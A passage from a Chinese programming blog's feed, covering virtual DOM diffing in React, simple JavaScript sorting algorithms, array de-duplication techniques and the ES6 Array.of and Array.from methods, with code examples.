class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">// diff 函数，对比两棵树</span><br><span class="line">function diff (oldTree, newTree) &#123;</span><br><span class="line">  var index = 0 // 当前节点的标志</span><br><span class="line">  var patches = &#123;&#125; // 用来记录每个节点差异的对象</span><br><span class="line">  dfsWalk(oldTree, newTree, index, patches)</span><br><span class="line">  return patches</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 对两棵树进行深度优先遍历</span><br><span class="line">function dfsWalk (oldNode, newNode, index, patches) &#123;</span><br><span class="line">  // 对比oldNode和newNode的不同，记录下来</span><br><span class="line">  patches[index] = [...]</span><br><span class="line"></span><br><span class="line">  diffChildren(oldNode.children, newNode.children, index, patches)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 遍历子节点</span><br><span class="line">function diffChildren (oldChildren, newChildren, index, patches) &#123;</span><br><span class="line">  var leftNode = null</span><br><span class="line">  var currentNodeIndex = index</span><br><span class="line">  oldChildren.forEach(function (child, i) &#123;</span><br><span class="line">    var newChild = newChildren[i]</span><br><span class="line">    currentNodeIndex = (leftNode &amp;&amp; leftNode.count) // 计算节点的标识</span><br><span class="line">      ? currentNodeIndex + leftNode.count + 1</span><br><span class="line">      : currentNodeIndex + 1</span><br><span class="line">    dfsWalk(child, newChild, currentNodeIndex, patches) // 深度遍历子节点</span><br><span class="line">    leftNode = child</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#####(2)差异类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//替换</span><br><span class="line">var REPLACE = 0;</span><br><span class="line">//排序</span><br><span class="line">var REORDER = 1;</span><br><span class="line">//属性变化</span><br><span class="line">var PROPS = 2;</span><br><span class="line">//文本</span><br><span class="line">var TEXT = 3;</span><br></pre></td></tr></table></figure></p><p>#####(3)列表对比算法</p><p>疑问：什么是DOM Diff算法 ？<br>Web界面由DOM树来构成，当其中某一部分发生变化时，其实就是对应的某个DOM节点发生了变化。在React中，构建UI界面的思路是由当前状态决定界面。前后两个状态就对应两套界面，然后由React来比较两个界面的区别，这就需要对DOM树进行Diff算法分析。</p><p>即给定任意两棵树，找到最少的转换步骤。但是标准的的Diff算法复杂度需要O(n^3)，这显然无法满足性能要求。要达到每次界面都可以整体刷新界面的目的，势必需要对算法进行优化。这看上去非常有难度，然而Facebook工程师却做到了，他们结合Web界面的特点做出了两个简单的假设，使得Diff算法复杂度直接降低到O(n)</p><p>1、两个相同组件产生类似的DOM结构，不同的组件产生不同的DOM结构；<br>2、对于同一层次的一组子节点，它们可以通过唯一的id进行区分。</p><p></p><h4>逐层进行节点比较</h4><br>在React中，树的算法其实非常简单，那就是两棵树只会对同一层次的节点进行比较.<br><img src="/imgs/visualdom/0909000.png" alt><p></p><p>React只会对相同颜色方框内的DOM节点进行比较，即同一个父节点下的所有子节点。当发现节点已经不存在，则该节点及其子节点会被完全删除掉，不会用于进一步的比较。这样只需要对树进行一次遍历，便能完成整个DOM树的比较。</p><h3>例如：</h3><p><img src="/imgs/visualdom/0909001.png" alt></p><p>A节点被整个移动到D节点下，直观的考虑DOM Diff操作应该是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A.parent.remove(A); </span><br><span class="line">D.append(A);</span><br></pre></td></tr></table></figure><p>但因为React只会简单的考虑同层节点的位置变换，对于不同层的节点，只有简单的创建和删除。当根节点发现子节点中A不见了，就会直接销毁A；而当D发现自己多了一个子节点A，则会创建一个新的A作为子节点。因此对于这种结构的转变的实际操作是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A.destroy();</span><br><span class="line">A = new A();</span><br><span class="line">A.append(new B());</span><br><span class="line">A.append(new C());</span><br><span class="line">D.append(A);</span><br></pre></td></tr></table></figure><h3>list-diff2算法 简介</h3><pre><code>oldList = [{id: 1}, {id: 2}, {id: 3}, {id: 4}, {id: 5}, {id: 6}];newList = [{id: 2}, {id: 3}, {id: 1},];var moves = diff(oldList, newList, &quot;id&quot;);// children 是源列表 根据 新列表返回 移动或新增的数据。// children = [//     {id: 1},//     {id: 2},//     {id: 3},//     null,//     null,//     null// ]// moves 是源列表oldList 根据新列表newList 返回的操作，children为null的话，依次删除掉掉，因此返回的是// type = 0 是删除操作， type = 1 是新增操作// moves = [//     {type: 0, index:3},//     {type: 0, index: 3},//     {type: 0, index: 3},//     {type: 0, index: 0},//     {type: 1, index: 2, item: {id: 1}}// ]</code></pre><p><a href="https://www.npmjs.com/package/list-diff2" target="_blank" rel="noopener">npm 库</a></p><p>#####（4）把差异应用到真正的DOM树上<br>见代码</p><p><br><br><br><br><br></p><h4 id="对虚拟DOM的误解"><a href="#对虚拟DOM的误解" class="headerlink" title="对虚拟DOM的误解"></a>对虚拟DOM的误解</h4><p>React等从来没有说过 “React 比原生操作DOM快”。React给我们的保证是，在不需要手动优化的情况下，它依然可以给我们提供过得去的性能。</p><p>React掩盖了底层的DOM操作，可以用更声明式的方式来描述我们目的，从而让代码更容易维护。</p><p>没有任何框架可以比纯手动的优化 DOM 操作更快，因为框架的 DOM 操作层需要应对任何上层 API 可能产生的操作，它的实现必须是普适的。针对任何一个 benchmark，我都可以写出比任何框架更快的手动优化，但是那有什么意义呢？在构建一个实际应用的时候，你难道为每一个地方都去做手动优化吗？出于可维护性的考虑，这显然不可能。</p><p>####还有<br>虚拟dom并没有比直接原生操作更快, 所谓”快”是有条件的<br>比如改变个颜色, 直接操作dom会更快.如果每次都是改变该改变的。那dom操作永远比虚拟dom快.但如果你的改动的地方很多, 而且要保持状态, 那虚拟dom的自动diff无疑会省心.<br>如果有很多复杂的操作，A+B+C, 这时候你要直接操作dom会很繁琐.<br>而且虚拟dom的核心在于diff, 它自动帮你计算那些应该调整, 然后只修改该修改的区域, 省下的不是运行速度这种速度, 而且我们开发方面的一些速度。以及运维的速度。其次，如果任何一点的变化都需要重新渲染整个应用，如果是真实DOM的话，这样的性能是不能接受的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;####引言&lt;br&gt;我们知道，DOM 操作真正的问题在于每次操作都会触发布局的改变、DOM树的修改和渲染。所以，当你一个接一个地去修改30个节点的时候，就会引起N次（潜在的）布局重算，N次（潜在的）重绘，等等。&lt;/p&gt;
&lt;h4 id=&quot;二、什么是虚拟DOM？&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>几个简单排序</title>
    <link href="http://swingboy.github.io/2018/03/01/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E6%8E%92%E5%BA%8F/"/>
    <id>http://swingboy.github.io/2018/03/01/几个简单排序/</id>
    <published>2018-03-01T04:12:00.000Z</published>
    <updated>2019-11-23T14:29:40.731Z</updated>
    
    <content type="html"><![CDATA[<p>####1.快速排序</p><p>基本思想：<br>1）选择一个基准元素,通常选择第一个元素或者最后一个元素,<br>2）通过一趟排序讲待排序的记录分割成独立的两部分，其中一部分记录的元素值均比基准元素值小。另一部分记录的 元素值比基准值大。<br>3）此时基准元素在其排好序后的正确位置<br>4）然后分别对这两部分记录用同样的方法继续进行排序，直到整个序列有序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function quickSort(arr) &#123;</span><br><span class="line">    //如果数组&lt;=1,则直接返回</span><br><span class="line">    if (arr.length &lt;= 1) &#123; return arr; &#125;</span><br><span class="line">    var pivotIndex = Math.floor(arr.length / 2);</span><br><span class="line">    //找基准，并把基准从原数组删除</span><br><span class="line">    var pivot = arr.splice(pivotIndex, 1)[0];</span><br><span class="line">    //定义左右数组</span><br><span class="line">    var left = [];</span><br><span class="line">    var right = [];</span><br><span class="line"></span><br><span class="line">    //比基准小的放在left，比基准大的放在right</span><br><span class="line">    for (var i = 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">        if (arr[i] &lt;= pivot) &#123;</span><br><span class="line">            left.push(arr[i]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            right.push(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //递归</span><br><span class="line">    return quickSort(left).concat([pivot], quickSort(right));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = quickSort([0, 33, 43, 32, 39, 2]);</span><br><span class="line">// console.log(a);</span><br></pre></td></tr></table></figure><p>2 插入排序<br>基本思想:<br>将一个记录插入到已排序好的有序表中，从而得到一个新，记录数增1的有序表。即：先将序列的第1个记录看成是一个有序的子序列，然后从第2个记录逐个进行插入，直至整个序列有序为止。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function sort(elements) &#123;</span><br><span class="line">    //假设第0个元素是一个有序的数列，第1个以后的是无序的序列，</span><br><span class="line">    //所以从第1个元素开始将无序数列的元素插入到有序数列中</span><br><span class="line">    for (var i = 1; i &lt; elements.length; i++) &#123;</span><br><span class="line">        //升序</span><br><span class="line">        if (elements[i] &lt; elements[i - 1]) &#123;</span><br><span class="line">            //取出无序数列中的第i个作为被插入元素</span><br><span class="line">            var guard = elements[i];</span><br><span class="line">            //记住有序数列的最后一个位置，并且将有序数列位置扩大一个</span><br><span class="line">            var j = i - 1;</span><br><span class="line">            elements[i] = elements[j];</span><br><span class="line"></span><br><span class="line">            //比大小，找到被插入元素所在的位置</span><br><span class="line">            while (j &gt;= 0 &amp;&amp; guard &lt; elements[j]) &#123;</span><br><span class="line">                elements[j + 1] = elements[j];</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            // console.log(j + 1, &apos;ssss&apos;)</span><br><span class="line">            //插入</span><br><span class="line">            elements[j + 1] = guard;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var elements = [10, 9, 8, 7, 6, 5];</span><br><span class="line"></span><br><span class="line">// 8 9 10   9</span><br><span class="line">// 8 9 10 10</span><br><span class="line">// console.log(&apos;before: &apos; + elements);</span><br><span class="line">// sort(elements);</span><br><span class="line">// console.log(&apos; after: &apos; + elements);</span><br></pre></td></tr></table></figure><p>####3.选择排序<br>选择排序（Selection sort）是一种简单直观的排序算法。它的工作原理是每一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，直到全部待排序的数据元素排完。 选择排序是不稳定的排序方法（比如序列[5， 5， 3]第一次就将第一个[5]与[3]交换，导致第一个5挪动到第二个5后面）。</p><p><code></code><br>var example = [8, 94, 15, 88, 55, 76, 21, 39];<br>function selectSort(arr) {<br>    var len = arr.length;<br>    var minIndex, temp;<br>    // console.time(‘选择排序耗时’);<br>    for (i = 0; i &lt; len - 1; i++) {<br>        minIndex = i;<br>        for (j = i + 1; j &lt; len; j++) {<br>            if (arr[j] &lt; arr[minIndex]) {<br>                minIndex = j;<br>            }<br>        }<br>        temp = arr[i];<br>        arr[i] = arr[minIndex];<br>        arr[minIndex] = temp;<br>    }<br>    // console.timeEnd(‘选择排序耗时’);<br>    return arr;<br>}<br>// console.log(selectSort(example));<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">####4.希尔排序</span><br><span class="line">希尔(Shell)排序又称为缩小增量排序，它是一种插入排序。它是直接插入排序算法的加强版。</span><br><span class="line">希尔排序的基本思想：</span><br><span class="line">把记录按步长 gap 分组，对每组记录采用直接插入排序方法进行排序。</span><br><span class="line">随着步长逐渐减小，所分成的组包含的记录越来越多，当步长的值减小到 1 时，整个数据合成为一组，构成一组有序记录，则完成排序。</span><br><span class="line"></span><br><span class="line">希尔排序：http://blog.csdn.net/morewindows/article/details/6668714</span><br></pre></td></tr></table></figure></p><p>var arr1 = [2, 5, 1, 9, 0];<br>function shellSort(arr) {<br>    var gap = Math.floor(arr.length / 2);<br>    while (gap &gt;= 1) {<br>        for (var i = gap; i &lt; arr.length; i++) {<br>            var j, temp = arr[i];<br>            for (j = i - gap; j &gt;= 0 &amp;&amp; temp &lt; arr[j]; j = j - gap) {<br>                arr[j + gap] = arr[j];<br>            }<br>            arr[j + gap] = temp;<br>        }<br>        // console.log(“gap=” + gap);<br>        // console.log(arr);<br>        gap = Math.floor(gap / 2);<br>    }<br>}<br>shellSort(arr1);</p><p>var arr1 = [2, 5, 1, 9, 0, 10];<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#### 5.归并排序</span><br><span class="line">归并操作(merge)，也叫归并算法，指的是将两个顺序序列合并成一个顺序序列的方法。</span><br><span class="line">如　设有数列&#123;6，202，100，301，38，8，1&#125;</span><br><span class="line">初始状态：6,202,100,301,38,8,1</span><br><span class="line">第一次归并后：&#123;6,202&#125;,&#123;100,301&#125;,&#123;8,38&#125;,&#123;1&#125;，比较次数：3；</span><br><span class="line">第二次归并后：&#123;6,100,202,301&#125;，&#123;1,8,38&#125;，比较次数：4；</span><br><span class="line">第三次归并后：&#123;1,6,8,38,100,202,301&#125;,比较次数：4；</span><br><span class="line">总的比较次数为：3+4+4=11,；</span><br><span class="line">逆序数为14；</span><br></pre></td></tr></table></figure></p><p>function mergeSort(arr) {  //采用自上而下的递归方法<br>    var len = arr.length;<br>    if(len &lt; 2) {<br>        return arr;<br>    }<br>    var middle = Math.floor(len / 2),<br>        left = arr.slice(0, middle),<br>        right = arr.slice(middle);<br>    return merge(mergeSort(left), mergeSort(right));<br>}</p><p>function merge(left, right){<br>    var result = [];<br>    while (left.length&gt;0 &amp;&amp; right.length&gt;0) {<br>        if (left[0] &lt;= right[0]) {<br>            result.push(left.shift());<br>        } else {<br>            result.push(right.shift());<br>        }<br>    }<br>    // console.log(left.length, ‘left’)<br>    console.log(right.length, ‘right’)<br>    while (left.length)<br>        result.push(left.shift());</p><pre><code>while (right.length)    result.push(right.shift());return result;</code></pre><p>}<br>var a = mergeSort(arr1);<br>console.log(‘a’, a)<br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;####1.快速排序&lt;/p&gt;
&lt;p&gt;基本思想：&lt;br&gt;1）选择一个基准元素,通常选择第一个元素或者最后一个元素,&lt;br&gt;2）通过一趟排序讲待排序的记录分割成独立的两部分，其中一部分记录的元素值均比基准元素值小。另一部分记录的 元素值比基准值大。&lt;br&gt;3）此时基准元素在其排
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>数组排序几种方法</title>
    <link href="http://swingboy.github.io/2018/02/27/%E6%95%B0%E7%BB%84%E6%8E%92%E5%BA%8F%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://swingboy.github.io/2018/02/27/数组排序几种方法/</id>
    <published>2018-02-27T11:20:47.000Z</published>
    <updated>2019-11-23T14:29:57.724Z</updated>
    
    <content type="html"><![CDATA[<p>##<br>1.遍历数组法<br>最简单的去重方法.<br>实现思路：新建一数组，遍历传入数组，值不在新数组就加入该新数组中；<br>注意点：判断值是否在数组的方法“indexOf”是ECMAScript5 方法，IE8以下不支持，需多写一些兼容低版本浏览器代码</p><h3 id="最简单数组去重法"><a href="#最简单数组去重法" class="headerlink" title="最简单数组去重法"></a>最简单数组去重法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function unique1(array)&#123; </span><br><span class="line">var n = [];</span><br><span class="line">for(var i = 0; i &lt; array.length; i++)&#123; </span><br><span class="line">if (n.indexOf(array[i]) == -1) </span><br><span class="line">n.push(array[i]);</span><br><span class="line">&#125; </span><br><span class="line">return n; </span><br><span class="line">&#125; </span><br><span class="line">var a = [2,3,4,3,5,3];</span><br><span class="line">var b = unique1(a);</span><br></pre></td></tr></table></figure><p>2.对象键值对法<br>该方法执行的速度比其他任何方法都快，就是占用的内存大一些。<br>实现思路：新建一js对象以及新数组，遍历传入数组时，判断值是否为js对象的键，不是的话给对象新增该键并放入新数组。<br>注意点：判断是否为js对象键时，会自动对传入的键执行“toString()”，不同的键可能会被误认为一样；例如： a[1]、a[“1”] 。解决上述问题还是得调用“indexOf”。</p><p>###速度最快，占空间最多（空间换时间）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function unique2(array)&#123;</span><br><span class="line">var n = &#123;&#125;, r = [], len = array.length, val, type;</span><br><span class="line">for (var i = 0; i &lt; array.length; i++) &#123;</span><br><span class="line">val = array[i]; </span><br><span class="line">type = typeof val; </span><br><span class="line">if (!n[val]) &#123;</span><br><span class="line">n[val] = [type];</span><br><span class="line">r.push(val);</span><br><span class="line">&#125; else if (n[val].indexOf(type) &lt; 0) &#123; </span><br><span class="line">n[val].push(type); </span><br><span class="line">r.push(val); </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">return r; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = [&#123;a:1,b:2&#125;,&#123;a:1,b:2&#125;,2,&apos;2&apos;,3,4,3,5,3];</span><br><span class="line">var b = unique2(a);</span><br></pre></td></tr></table></figure></p><p>3.数组下标判断法<br>还是得调用“indexOf”性能跟方法1差不多，<br>实现思路：如果当前数组的第i项在当前数组中第一次出现的位置不是i，那么表示第i项是重复的，忽略掉。否则存入结果数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function unique3(array)&#123; </span><br><span class="line">var n = [array[0]]; //结果数组 </span><br><span class="line">//从第二项开始遍历 </span><br><span class="line">for(var i = 1; i &lt; array.length; i++) &#123; </span><br><span class="line">//如果当前数组的第i项在当前数组中第一次出现的位置不是i， </span><br><span class="line">//那么表示第i项是重复的，忽略掉。否则存入结果数组 </span><br><span class="line">if (array.indexOf(array[i]) == i) &#123;</span><br><span class="line">n.push(array[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">return n; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">var a = [2,3,4,3,5,3];</span><br><span class="line">var b = unique3(a);</span><br><span class="line">// console.log(&apos;three:&apos; + b);</span><br></pre></td></tr></table></figure><p>4.排序后相邻去除法<br>原生数组的”sort”方法排序结果不怎么靠谱，对于不要求顺序的去重需求没什么问题。<br>实现思路：给传入数组排序，排序后相同值相邻，然后遍历时新数组只加入不与前一值重复的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 将相同的值相邻，然后遍历去除重复值</span><br><span class="line">function unique4(array)&#123;</span><br><span class="line">array.sort();</span><br><span class="line">var re=[array[0]];</span><br><span class="line">for(var i = 1; i &lt; array.length; i++)&#123; </span><br><span class="line">if( array[i] !== re[re.length-1])&#123; </span><br><span class="line">re.push(array[i]); </span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">return re; </span><br><span class="line">&#125;</span><br><span class="line">var a = [2,3,4,3,3,5,3];</span><br><span class="line">var b = unique4(a);</span><br><span class="line">// console.log(b);</span><br></pre></td></tr></table></figure></p><p>5.优化遍历数组法<br>实现思路：获取没重复的最右一值放入新数组。（检测到有重复值时终止当前循环同时进入顶层循环的下一轮判断）<br>简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function unique5(array)&#123;</span><br><span class="line">var r = [];</span><br><span class="line">for(var i = 0, l = array.length; i &lt; l; i++) &#123;</span><br><span class="line">// console.log(i);</span><br><span class="line">for(var j = i + 1; j &lt; l; j++) &#123;</span><br><span class="line">// console.log(i+&apos;-----&apos;+j);</span><br><span class="line">if (array[i] === array[j]) &#123;</span><br><span class="line">i++;</span><br><span class="line">j = i;</span><br><span class="line">// j = ++i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(array[i]);</span><br><span class="line">r.push(array[i]);</span><br><span class="line">&#125;</span><br><span class="line">return r;</span><br><span class="line">&#125;</span><br><span class="line">var a = [2,3,4,3,2,3,5,3];</span><br><span class="line">var b = unique5(a);</span><br><span class="line">console.log(&apos;unique5:&apos;+b);</span><br></pre></td></tr></table></figure></p><p>6.删除有重复的元素法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function unique6(array)&#123;</span><br><span class="line">var arrayN = array.slice();</span><br><span class="line">for(var i = 0 ; i &lt; arrayN.length; i++) &#123;</span><br><span class="line">for(var j = i + 1; j &lt; arrayN.length; j++) &#123;</span><br><span class="line">if (arrayN[i] === arrayN[j]) &#123;</span><br><span class="line">arrayN.splice(j,1);</span><br><span class="line">i-- ; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return arrayN; </span><br><span class="line">&#125;</span><br><span class="line">var a = [2,3,4,3,2,3,3,5,3];</span><br><span class="line">var b = unique6(a);</span><br><span class="line">// console.log(&apos;unique6:&apos;+b);</span><br></pre></td></tr></table></figure><ol start="7"><li>$.unique([2,3,4,3,2,3,5,3]);<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// var a = [2,3,4,3,2,3,3,5,3];</span><br><span class="line">// var b = $.unique([2,3,4,3,2,3,5,3]);</span><br><span class="line">// console.log(&apos;last:&apos; + b);</span><br></pre></td></tr></table></figure></li></ol><p>8正则匹配，不适用复杂的数据结构<br>原理基本差不多，效率我还没有验证。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function unique7(array)&#123;</span><br><span class="line">var rArr = [];</span><br><span class="line">for(var i = 0,len = array.length;i &lt; len; i++)&#123; </span><br><span class="line">!RegExp(array[i],&quot;g&quot;).test(rArr.join(&quot;,&quot;)) &amp;&amp; (rArr.push(array[i])); </span><br><span class="line">&#125;</span><br><span class="line">return rArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = [2,3,4,3,2,3,3,5,3,&apos;3&apos;];</span><br><span class="line">var b = unique7(a);</span><br><span class="line">// console.log(&apos;unique7: &apos;+ b);</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;##&lt;br&gt;1.遍历数组法&lt;br&gt;最简单的去重方法.&lt;br&gt;实现思路：新建一数组，遍历传入数组，值不在新数组就加入该新数组中；&lt;br&gt;注意点：判断值是否在数组的方法“indexOf”是ECMAScript5 方法，IE8以下不支持，需多写一些兼容低版本浏览器代码&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>关于数组Array</title>
    <link href="http://swingboy.github.io/2018/02/27/%E5%85%B3%E4%BA%8E%E6%95%B0%E7%BB%84/"/>
    <id>http://swingboy.github.io/2018/02/27/关于数组/</id>
    <published>2018-02-27T09:02:57.000Z</published>
    <updated>2019-11-23T14:29:30.800Z</updated>
    
    <content type="html"><![CDATA[<p>#ABOUT ARRAY</p><h4 id="Array构造器"><a href="#Array构造器" class="headerlink" title="Array构造器"></a>Array构造器</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用Array构造器</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">Array</span>(<span class="number">8</span>); <span class="comment">// [undefined × 8]</span></span><br><span class="line"><span class="comment">// 使用对象字面量</span></span><br><span class="line"><span class="keyword">var</span> b = [];</span><br><span class="line">b.length = <span class="number">8</span>; <span class="comment">// [undefined × 8]</span></span><br></pre></td></tr></table></figure><h4 id="ES6新增的构造函数方法"><a href="#ES6新增的构造函数方法" class="headerlink" title="ES6新增的构造函数方法"></a>ES6新增的构造函数方法</h4><p>ES6专门扩展了数组构造器Array ，新增2个方法：Array.of、Array.from。</p><h5 id="Array-of"><a href="#Array-of" class="headerlink" title="Array.of"></a>Array.of</h5><p>Array.of基本上可以用来替代Array()或new Array()，并且不存在由于参数不同而导致的重载。它的行为非常统一。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Array.of() // []</span><br><span class="line">Array.of(undefined) // [undefined]</span><br><span class="line">Array.of(1) // [1]</span><br><span class="line">Array.of(1, 2) // [1, 2]</span><br></pre></td></tr></table></figure><p>#####Array.from</p><p>Array.from方法用于将两类对象转为真正的数组：<br>类似数组的对象  